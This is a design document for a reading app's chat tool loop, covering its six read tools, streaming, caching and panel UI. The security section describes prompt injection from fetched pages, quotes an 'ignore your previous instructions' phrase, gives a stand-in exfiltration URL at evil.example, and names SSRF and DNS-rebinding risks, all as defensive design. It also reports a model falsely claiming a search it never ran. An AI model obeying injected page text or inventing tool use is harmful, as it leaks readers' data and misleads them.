# The tools chat can reach for

**Built 2026-08-26.** Chat could already search the web. What it could not do was anything with
*the reader's own things* — the article's exact words, the other articles they have saved, a page
one of them links to. It can now, through a **tool loop**: the model asks for a tool by name, the
server runs it, the result goes back into the same conversation, and the model answers.

Code: [`src/chat-tools.ts`](../../src/chat-tools.ts) (what a tool is, and the only place one runs),
[`src/converse.ts`](../../src/converse.ts) (`converse`, the loop — and `accumulateToolCalls`),
[`src/routes.ts`](../../src/routes.ts) § `streamChat` (the `tool` frame),
[`src/web/useChat.ts`](../../src/web/useChat.ts) (assigning by index),
[`src/web/ChatPanel.tsx`](../../src/web/ChatPanel.tsx) § `ToolStrip`.
Tests: [`tests/chat-tools.test.ts`](../../tests/chat-tools.test.ts).
Built on top of [chat-mode.md](../plans/chat-mode.md), which is where the panel and the citation
contract come from.

```
   THE READER ASKS                                        THE PANEL SHOWS
        │                                            ┌──────────────────────────┐
        ▼                                            │ ⌕ searched your library   │
   ┌─────────┐  round 1   ┌──────────────┐           │   “predictive processing” │
   │ converse│───────────►│  the model   │           │                        4 │
   │         │◄───────────│              │           │ ▤ read aeon.co            │
   └────┬────┘ tool_calls └──────────────┘           │              first 12k    │
        │                                            ├──────────────────────────┤
        ▼                                            │ Seth ties feeling to      │
   ┌─────────────┐   runTool()                       │ living processes          │
   │ chat-tools  │   fetch a page, search the        │ [spya-k3m9qt]. You read   │
   │             │   library, read a passage…        │ a related argument in     │
   └────┬────────┘                                   │ “Feeling & Knowing”…      │
        │  role:"tool" messages appended             └──────────────────────────┘
        ▼
   ┌─────────┐  round 2   ┌──────────────┐
   │ converse│───────────►│  the model   │  ──►  the answer, streamed
   └─────────┘◄───────────└──────────────┘
```

## What Greg asked for, and what is here

> Give the Chat the ability to use tools, e.g. web search. Anything else you can think of that would
> be useful?
>
> — Greg, 2026-08-26

Web search was already there and stayed (see below). Asked which of four candidates to build, he took
three and added a fourth, plus a list of ideas that are **not built** and are recorded at the bottom
of this file rather than lost:

> And also search this article by text. For the "Search your library", I think we had built machinery
> already for this (using embeddings and hybrid search) - let's reuse that. Perhaps there could also
> be a tool to access the Glossary (both read and add/update), generate Tweet thread, add a
> "Question" with comment to a section (so it's waiting there for the reader when they hit it), etc.
>
> — Greg, 2026-08-26

**One correction, stated plainly because it changes what `search_library` is.** The embeddings and
hybrid search are *not built*. [semantic-search.md](../plans/semantic-search.md) is a plan — second
draft, past a GPT Sol review — and [`evals/embedding-retrieval.ts`](../../evals/embedding-retrieval.ts)
measured four models over this project's own articles, but there is no `src/` code. What exists is
`searchLibrary`, which matches literal words. So the tool uses that, and the tool's own description
tells the model so, which matters more than it sounds: an AND-matcher over unstemmed words needs the
model to try a second phrasing before concluding the reader has never read about something.

That plan records the number this is measured against: **the literal matcher found 0 of ~85 relevant
passages across 18 reader-phrased queries.** Not few — none. So `search_library` is the tool most
improved by work that is already planned, and the seam it goes behind is `librarySearch.searchLibrary`
in [`src/store/`](../../src/store/index.ts) — a store contract, so the semantic matcher lands there
and this file does not change.

## The six, and the filter they had to pass

> **Does it send the reader somewhere they could not otherwise get to?**

| Tool | What it does | Why it earns its place |
|---|---|---|
| `search_article_words` | Every paragraph in **this** article containing all of some words, with counts | The one thing the model in the prompt genuinely cannot do: *be sure*. "Does he ever use the word qualia?" is a question about exhaustiveness, and a model reading 24,000 tokens will not answer it reliably |
| `search_article_meaning` | Passages matching a description, via [`findPassages`](../../src/search.ts) | For a sweep of a long piece where you need **all** of something and the words vary. Costs a model call, and its description says to prefer just reading |
| `search_library` | Passages in the reader's **other** saved articles | The one nothing else can offer. See above, and [search.md](search.md) |
| `read_library_passage` | A passage from another article, with paragraphs either side | Makes the previous one usable — one paragraph rarely says what an author argued |
| `read_web_page` | Fetch a page and read its main text | Web search gives snippets. This gives the piece. "What does the study he cites actually say?" |
| `article_glossary` | This article's [glossary](glossary.md), if one has been generated | So an answer about a term agrees with what the app has already told the reader, rather than quietly contradicting it |

**There is no `summarise_article` tool and there should never be one.** The whole article is in the
prompt on every turn, so it would be a model call to do a thing the model can already do — wearing a
badge that says it did research. It is [the anti-goal](vision.md#anti-goals) with a spinner in front
of it. `tests/chat-tools.test.ts` asserts no tool name matches `/summar/i`, which is a blunt check
and is meant to be.

### Web search is still OpenRouter's, and is not in that table

`openrouter:web_search` is a **server** tool: it runs inside the provider and comes back in the same
response, so it costs no extra round trip. It is therefore offered in *every* round, including the
last one where our own tools are withheld. Nothing on this side sees it start or finish — all that
arrives is a count in `usage` — which is why the panel renders it as one row saying only how many
searches ran. **It does not say what was searched for, because we do not know**, and a plausible
invented query would be the most convincing wrong thing on the screen.

## The loop, and the three things that are not obvious

### 1. `index` is the identity of a streamed tool call, not `id`

Only the **first** delta of a call carries `id` and `function.name`; every delta after it carries a
fragment of the JSON argument string and an index. Keying on `id` turns one working call into four
nameless ones, each of which is then dropped for having no name — which looks exactly like a model
that decided not to use a tool. `accumulateToolCalls` in [`src/converse.ts`](../../src/converse.ts)
is the one place this happens, and the test drives it with frames copied from a live response rather
than with frames we imagined.

### 2. The last round is offered no tools of ours, and that is what terminates the loop

`MAX_TOOL_ROUNDS` is 3. A cap that simply *stops* after N rounds has to throw away whatever the model
asked for on round N, leaving an assistant message carrying tool calls nothing answered — which the
provider rejects. Withholding the tools instead means the model cannot ask again, so the final round
is always prose.

The cost of a round is **the whole request again**: the article, the history, and every tool result so
far. Which is why the caps in `chat-tools.ts` are small, and why `rounds` is logged.

**But the article is not paid for twice, and that was measured rather than hoped.** A two-round turn
on the Noema article, 2026-08-26: `cacheReadTokens: 23363, cacheWriteTokens: 579`. Round two read the
whole article back out of the cache and paid the write only on the short tail the tool result added.
That is the number to watch — [prompt-caching.md](prompt-caching.md) is the full argument, and a
`cacheReadTokens: 0` on a `rounds: 2` line means every round is paying full price and the only
symptom is the bill. It works because `buildConverseMessages` builds the head once and the loop only
ever *appends*: the article message is byte-identical in every round, which
[`tests/chat-tools.test.ts`](../../tests/chat-tools.test.ts) pins directly.

### 3. One deadline for the turn, a fresh stall clock per round

Different questions. The deadline asks *has this reader waited long enough* and must not be resettable
by a tool finishing. The stall clock asks *is this connection alive*, which is only meaningful while
there is a connection — so it is rebuilt each round and, importantly, **is not running while a tool
runs.** A tool taking eight seconds is not a stalled stream. An earlier draft shared one stall
controller across rounds and killed exactly that.

`CHAT_TIMEOUT_MS` is unchanged at 120s and now has to cover several rounds. If real turns start
hitting it, that is the number to move — not the round cap.

## What the reader sees

Greg chose the more expensive of two options:

> A live line, kept afterwards.
>
> — Greg, 2026-08-26

So a `tools` array goes on the stored message. What it buys is that a reader coming back to a thread
a month later can see **why an answer said what it said** — which page it read, which of their own
articles it found — rather than taking a confident paragraph on trust. That is the same argument the
block-id citations are built on ([chat-mode.md § The citation contract](../plans/chat-mode.md)),
pointed at the half of an answer that does *not* come from the article.

Three details that are decisions rather than styling:

- **The strip is above the answer, not below it.** Sources sit below because you want them after
  reading; this is what happened while you waited, and by the time the answer is written it is
  already read. Above also means it does not shuffle down the panel as text streams in underneath.
- **A row is replaced, not appended.** Two events share one `index`, so "searching your library…"
  becomes "searched your library — 4 passages" in place. The client assigns into an array;
  matching a start event to an end event would be the same job with an extra way to get it wrong.
- **The words are written on the server.** `label` and `detail` come from `chat-tools.ts`, so a new
  tool reads correctly in the panel without anyone touching the client. Only the *icon* is a client
  switch, and an unknown tool falls through to a magnifying glass — a slightly wrong icon beside
  correct words is a far smaller failure than a blank row.

## Security: a tool result is data, and one of them is a stranger's

`read_web_page` puts arbitrary text from the open web into a prompt that also holds an article and a
reader's question. A page saying "ignore your previous instructions" is not exotic; people put those
on pages on purpose.

What is done about it:

- the text is fenced by `untrusted()` with a long delimiter, and any occurrence of that delimiter
  **inside** the content is broken up — a page that closes the fence itself and writes instructions
  after it is the one attack this cheap mechanism must survive;
- the system prompt says what the fence means and what to do when something inside it is addressed
  to the model;
- fetching goes through [`fetchDocument`](../../src/fetch.ts), which carries the scheme check, the
  **private-address guard**, the redirect limit and the size cap. The model is now one of the things
  choosing a URL, so "persuaded to read `http://169.254.169.254/`" is a real request shape. Writing a
  bare `fetch` here would have been three lines and an SSRF hole;
- `read_library_passage` validates its slug with `isSlug` before it reaches the store, because a slug
  is a path segment there and the model now chooses that string too. See
  [security.md](security.md).

**This is a mitigation, not a fix.** A determined injection can still steer an answer.

**And "these tools are all reads, so nothing can be sent" — which this section said until a GPT-5.6
review took it apart on 2026-08-26 — is false.** A GET is an outbound request. A hostile page can
tell the model its next move is `read_web_page("https://evil.example/collect?q=<the article, or the
reader's question>")`, and the fence that is supposed to stop it is prompt text, which is not a
boundary. Reading is not neutral when the URL is the message.

What is done about *that*, specifically: `read_web_page` refuses a URL whose query and fragment
exceed `MAX_URL_QUERY_CHARS` (256) or whose whole length exceeds 2,048, and tells the model to say so
to the reader. Being exact about what that buys — **it stops bulk exfiltration and not a determined
trickle.** Four rounds at 256 characters is a kilobyte and nothing here would notice. The proper fix
is an allowlist and it is in [§ Still open](#still-open).

What *does* still hold, and is worth keeping true: nothing chat can call writes a file, deletes
anything, or spends money. That is the reason the write tools below are not built yet — the first one
that writes turns "an injected page made the answer wrong" into "an injected page changed the
reader's data".

## What is logged

Tool names, slugs, block ids, counts, elapsed times, HTTP statuses, and the **host** of a URL. Never
the reader's query, never a tool's returned text, never a full URL — a URL the model chose to read is
a fact about what the reader was asking, and a path can carry the question in it. Same rule as
[logging.md](logging.md), and the same one `converse` already followed for questions and answers.

Two new fields on the answer's log line: `rounds` (how many times the whole article was re-sent) and
`tools` (how many calls that bought). `rounds: 4` on a run of answers means the model is going round
in circles and the tool descriptions need looking at.

## The bug that shaped the literal search

The first live run asked *"how many times does this article use the word consciousness?"*. The tool
returned ten paragraphs. The model — correctly — refused to trust a list that might be a sample,
announced it would count the article by hand instead, and spent its **entire** output budget doing
so, returning `finish_reason: "length"` with not one character of text. Which `converse` then reported
as "the model returned no text": a true sentence that sends you looking in completely the wrong place.

A cap that does not say it is a cap is [silent-success](../reusable/silent-success.md) pointed at a
model rather than at a person, and it fails the same way — everything looks fine and the answer is
wrong. So the tool now returns `total` and `occurrences`, states them as exact and exhaustive, and
says whether the list below them is all of the matches or the top of them. The same run then answered
in 8 seconds with four cited blocks.

The other half of that afternoon: `max_tokens` went from 2,000 to 4,000, because on Sonnet 5 the
reasoning tokens come out of the same budget and a tool result to digest can consume all of it before
a word is written.

## Not built, and worth building

Greg's list, with a recommendation each so nobody is blocked. All three are **writes**, which is the
line the six above deliberately do not cross — see the security section.

| Idea | Recommendation |
|---|---|
| **Plant a question on a section** — a comment waiting where the reader will hit it | **Do this one first.** It is the most Spideryarn-ish thing on the list: the model prepares the reading rather than replacing it, and it is the only one that acts *later*. Needs a `Comment` that is a question rather than an answer, which is a schema change — see [comments.md](comments.md) |
| **Glossary add/update** | Worth it, and cheap to read (`article_glossary` already does). Writing means an entry arriving without the provenance the generated ones carry, so a hand-added entry needs to be visibly one. See [glossary.md](glossary.md) |
| **Generate a tweet thread** | Least valuable of the three. It is a whole pipeline stage with a page of its own ([tweet-thread-page.md](../plans/tweet-thread-page.md)), it is expensive, and "make me a thread" from inside a reading companion is a different product |
| **`add_to_library(url)`** — offered and not taken | Would want a confirm step rather than firing on the model's say-so: it spends money and changes state. [ingest-queue.md](ingest-queue.md) |

## What the browser pass found

Checked in Chrome on 2026-08-26, against a stored conversation and four fresh questions. The strip
renders above the answer, stays visually subdued against it, keeps its right-hand detail legible,
survives two reloads with every row and detail identical (including a `nothing found`), causes no
horizontal overflow, and logs no console error of its own.

Three things it could **not** confirm, recorded rather than rounded up to a pass:

- **The `running` state itself was never caught.** A `MutationObserver` armed in advance across three
  tool calls fired zero times before the row appeared already finished — the tools are simply too
  fast. So "no two spinners at once" is *not observed to be broken* rather than confirmed correct.
- **No label was long enough to wrap.** The panel is ~400px and the longest label tried was
  `searched this article for “consciousness”`. The wrapping rules in `.chat-tool` are written and
  unverified.
- **Dark mode was not checked** — there is no theme toggle in the app to check it with.

It also found the bug in the section below, and one that is not this feature's:
[chat-mode.md § What is still open](../plans/chat-mode.md#what-is-still-open) now records a dropped
SSE stream leaving the panel on "thinking…" for ever with no recovery.

## The model claimed a search it never ran

The same pass asked "does this article discuss panpsychism?" and got an answer whose text said *"the
search returns no matches"* — with **no tool strip above it at all**, confirmed in the DOM and again
after a reload. The model had not searched. It had described searching.

That is worse here than it would be in a plain chatbot, and the reason is the strip itself. A reader
who compares the two sees a flat contradiction; a reader who does not compare believes a lookup
happened. Either way the strip stops being evidence, which is the only thing it was for.

The prompt now says so directly — *"Do not write 'the search returns no matches', 'I looked it up',
'I could not find it' or anything like it unless you actually called the tool on this turn"* — and,
just as importantly, gives it the alternative it was missing: *"the article does not discuss
panpsychism" is a fine sentence and does not need a search behind it.* The same question afterwards
called `search_article_words`, got `nothing found`, and said so.

**The check for this is the strip against the words**, and it stays a human one. Nothing counts it.

## The reader's own article ate its own search results

`search_library` is for the reader's **other** articles. The one they have open is already in the
prompt in full, so a hit in it is a paragraph the model can see anyway, and offering it back as
"something else you have read" is actively wrong.

That was done by filtering the store's results, and the order was the bug. The store caps the list
first. So an article that supplied every hit in the capped list left the tool with an empty list —
and it said **`nothing found`**, for a query whose good answer was sitting one place below the cut.
The reader had no way to tell the difference between "you have not read about this" and "you have
read about this so much that we lost it".

The first patch asked the store for four times as many hits and filtered those. That narrowed the
window; it did not close it, because one article can supply more than four times the cap on its own —
which this file said out loud at the time, and it stayed true.

The fix is an argument on the store contract, `excludeSlug`, so the exclusion happens **inside the
query, before the cap** — `LibrarySearchOptions` in [`src/store/contracts.ts`](../../src/store/contracts.ts),
kept by both adapters ([`src/library-search.ts`](../../src/library-search.ts) drops the directory
before it reads it, [`src/store/pg-shelf.ts`](../../src/store/pg-shelf.ts) puts a `ne` in the `WHERE`
clause). The over-fetch is gone with it: once nothing is filtered afterwards, asking for four times
the cap is paying to rank and return rows nobody reads. `capped` and the hit count now mean what they
say, which they did not before — the tool used to tell the model "there were more matches than are
shown" when the only extra matches were in the article on the reader's screen.

**This landed before the semantic matcher, and that reverses what this file recommended.** The
argument for waiting was that `search_library` is literal, the literal matcher is being replaced by
[semantic-search.md](../plans/semantic-search.md), and work on a thing that is about to be deleted is
usually wasted. Three things make it wrong here:

- **`excludeSlug` is not matcher work.** It is one line in each adapter's filter, and it survives the
  matcher swap untouched — a vector search excludes an article by the same `WHERE` clause. The
  semantic matcher inherits a seam that already has parity tests on it rather than acquiring a new
  argument on its first day.
- **The bug is live and it is the silent kind.** Nothing anywhere reports it. The tool says
  `nothing found`, the model says the reader has not read about this, and the strip above the answer
  agrees — a search *did* run. See [silent-success](../reusable/silent-success.md).
- **Waiting had a running cost.** The over-fetch was fetching and ranking 32 rows to use 8, on every
  `search_library` call, for as long as the plan took.

The tests are [`tests/chat-library-exclusion.test.ts`](../../tests/chat-library-exclusion.test.ts) —
which builds a library where the open article supplies more matches than the over-fetch, so the old
mitigation cannot pass it — plus the before-the-cap case in each adapter's own suite, and the rule
itself in [`tests/store-parity.test.ts`](../../tests/store-parity.test.ts). Parity here is narrower
than it sounds and deliberately so: the two matchers are *allowed* to find different blocks, so what
they are held to is that excluding an article removes every hit from it and leaves every other hit
alone, in order.

## Still open

- **Tools run one at a time.** Two web pages fetched at once would be twice as fast; what it costs is
  the reader watching one line at a time and understanding what is being done for them. Models here
  ask for one or two tools at a time, so the saving is small today. Revisit if that changes.
- **A tool cannot be stopped mid-flight.** The reader's signal reaches `fetchDocument` and
  `findPassages`, so a stop does end them — but the loop only notices between tools, so a stop during
  a 20-second meaning search waits for it. Bounded by `TOOL_TIMEOUT_MS`, not fixed by it.
- **`search_library` is literal.** See the top of this file; the fix is
  [semantic-search.md](../plans/semantic-search.md) and it lands behind the store contract.
- **`read_web_page` can still be used to send a little.** The query cap above bounds it; it does not
  close it. The fix is an **allowlist**: fetch only URLs that are already in play — links in this
  article's blocks, URLs the reader typed into the conversation, and the citation URLs OpenRouter's
  web search returned this turn (which `converse` already collects). That covers every legitimate use
  these tools were designed for and closes the channel rather than narrowing it. Not built because it
  is a real piece of work and wants its own plan.
- **The private-address guard does not stop DNS rebinding.** `guardAddress` in
  [`src/fetch.ts`](../../src/fetch.ts) resolves the hostname, checks the addresses, and then `fetch`
  resolves it *again* — so a hostname that answers publicly for the check and `127.0.0.1` for the
  connection gets through. That is not new and it is not this feature's bug, but this feature makes it
  matter more: the hostname used to come from the reader and now comes from the model, which can be
  argued into one by a page. The proper fix is connecting to a pinned address rather than re-resolving,
  which belongs to `src/fetch.ts` and its owner. Also raised by the review.
- **Reasoning blocks are not replayed across a tool round.** Anthropic asks that thinking blocks be
  returned unmodified alongside tool results, and we send `content` and `tool_calls` only. It works
  today — every live run in this file's history completed — but "works today" is the whole of the
  evidence, and the failure it invites is a quietly worse continuation rather than an error. Raised by
  the review; the fix is to carry `reasoning_details` on the assistant turn and it needs measuring
  rather than assuming.
- **The final round changes the tools array, which changes the cached prefix.** Tools are rendered
  ahead of system and messages, so withholding them on the last round costs a cache write on the one
  path that has already been expensive. It only happens after three tool rounds, which is rare, and
  the alternative designs all trade it for a loop that can fail to terminate — so it stands, named
  rather than hidden. Also from the review.
- **Nothing measures whether the tools make answers better.** This is the same gap
  [original-version/search-and-chat.md](original-version/search-and-chat.md) reports about the
  previous version's chat — a year of work and no document assessing whether it helped anyone read.
  The countable version would be an eval comparing answers with tools and without, and it does not
  exist yet.
